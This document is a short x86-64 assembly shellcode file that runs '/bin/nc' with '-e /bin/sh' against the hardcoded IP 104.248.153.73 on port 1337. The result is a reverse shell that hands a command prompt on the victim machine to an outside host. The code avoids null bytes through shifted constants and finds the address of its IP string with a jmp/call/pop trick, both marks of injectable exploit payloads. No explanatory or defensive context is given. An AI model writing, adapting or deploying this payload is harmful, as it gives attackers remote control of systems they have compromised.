    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    xor    	rdx,rdx
    mov 	rdi,0x636e2f6e69622fff
    shr	rdi,0x08
    push 	rdi
    mov 	rdi,rsp

    mov	rcx,0x68732f6e69622fff
    shr	rcx,0x08
    push 	rcx
    mov	rcx,rsp

    mov     rbx,0x652dffffffffffff
    shr	rbx,0x30
    push	rbx
    mov	rbx,rsp

    mov	r10,0x37333331ffffffff
    shr 	r10,0x20
    push 	r10
    mov	r10,rsp

    jmp short ip
    continue:
    pop 	r9

    push	rdx  ;push NULL
    push 	rcx  ;push address of 'bin/sh'
    push	rbx  ;push address of '-e'
    push	r10  ;push address of '1337'
    push	r9   ;push address of 'ip'
    push 	rdi  ;push address of '/bin/nc'

    mov    	rsi,rsp
    mov    	al,59
    syscall

ip:
	call  continue
	db "104.248.153.73"